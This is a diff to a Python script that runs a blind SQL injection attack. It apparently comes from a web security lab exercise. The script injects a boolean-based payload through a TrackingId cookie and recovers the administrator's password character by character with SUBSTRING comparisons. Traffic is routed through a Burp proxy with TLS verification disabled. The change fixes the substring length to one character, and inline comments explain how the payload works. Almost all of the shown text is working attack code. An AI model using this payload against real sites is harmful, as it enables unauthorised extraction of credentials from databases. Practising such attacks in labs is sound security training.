@@ -16,7 +16,7 @@ import sys
 def is_greater_than_char(base_url: str, i: int, character:str) -> bool: #this function looks through each integer of the password string looking if its greater than the character we are looking for. it returns a boolean value of true if the text Welcome back is displayed in the response
     response = requests.get(
         base_url,
-        cookies={"TrackingId": f"1' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, {i}) > '{chr(character)}"},#this is the payload, we are using the tracking id cookie to inject the payload. the i and i is the positional argument for the substring function. it is the number we are looking for. 
+        cookies={"TrackingId": f"1' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) > '{chr(character)}"},#this is the payload, we are using the tracking id cookie to inject the payload. the i and i is the positional argument for the substring function. it is the number we are looking for. the 1 is set to 1 character as we want 1 character eac time
         proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},# this is a dict object, used for Burp
         verify=False,
         )
